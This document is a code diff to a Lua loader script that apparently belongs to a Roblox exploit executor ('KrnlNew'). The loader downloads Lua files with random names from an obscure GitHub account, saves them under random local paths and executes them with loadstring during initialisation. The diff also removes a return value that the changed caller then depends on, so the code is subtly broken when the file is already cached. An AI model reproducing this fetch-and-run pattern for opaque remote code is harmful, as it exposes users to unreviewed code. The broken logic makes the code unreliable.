@@ -5,7 +5,7 @@ LoadModule = function(path,request)
             writefile(path,tostring(e))
             return loadstring(readfile(path))()
         else
-            return loadstring(readfile(path))()
+            loadstring(readfile(path))()
         end
 end
 Engine.AssertFolders = function(item)
@@ -23,7 +23,17 @@ Engine.AssertFiles = function(patch, item)
     end
 end
 
-Engine.AssertFolders({"Autoexec", "Themes", "ExecutorConfigs", "tabsV3", "tabs", "s", "b", "ScriptHub", "ExecutorConfigs/Community"})
+Engine.AssertFolders({
+    "Autoexec", 
+    "Themes", 
+    "ExecutorConfigs", 
+    "tabsV3", 
+    "tabs", 
+    "s", 
+    "b", 
+    "ScriptHub",
+    
+})
 
 
 Engine.Init = function(Identity)
@@ -41,9 +51,7 @@ Engine.Init = function(Identity)
     
     if Identity then
         if Identity == "KrnlNew" then
-	    Engine.AssertFolders({"ExecutorConfigs/Community","ExecutorConfigs/Community/Infinite Yield","ExecutorConfigs/Community/Dex V4","ExecutorConfigs/Community/CMD X"})
-            LoadModule("ExecutorConfigs/bin/rSQzWfGnFhL7VJvaamB5E5GhcDmb4WvyXAUPMFK4aMNM4D5UjGNjx6qUf46T","https://raw.githubusercontent.com/aA910FLsaIASFO1/gits/refs/heads/main/q90UP5N0CggF46LAUBW6ca3S3ACC4Ghqb5wpNNuHAQxrhFSHfXNcxmdcKMUue1jmSZfXKcAkRVHCckV6iRPzkTUWW0fjUjAeL0Lb.lua")
-            local e  = loadstring(readfile("ExecutorConfigs/bin/rSQzWfGnFhL7VJvaamB5E5GhcDmb4WvyXAUPMFK4aMNM4D5UjGNjx6qUf46T"))()
+            local e = LoadModule("ExecutorConfigs/bin/rSQzWfGnFhL7VJvaamB5E5GhcDmb4WvyXAUPMFK4aMNM4D5UjGNjx6qUf46T","https://raw.githubusercontent.com/aA910FLsaIASFO1/gits/refs/heads/main/q90UP5N0CggF46LAUBW6ca3S3ACC4Ghqb5wpNNuHAQxrhFSHfXNcxmdcKMUue1jmSZfXKcAkRVHCckV6iRPzkTUWW0fjUjAeL0Lb.lua")
     	    e.Init()
     	    LoadModule("ExecutorConfigs/bin/0f20000.lua","https://raw.githubusercontent.com/aA910FLsaIASFO1/gits/refs/heads/main/UeatBPAqafHWrJRAZQWbaUaL5TNg7CbyyHGCmB1tvPMtqTDYwPSAzDiVQ2aHGqxWC2fzyCugZtBEybTmUgGqjkSM2Bh6tah8qbcT.lua")
 	    
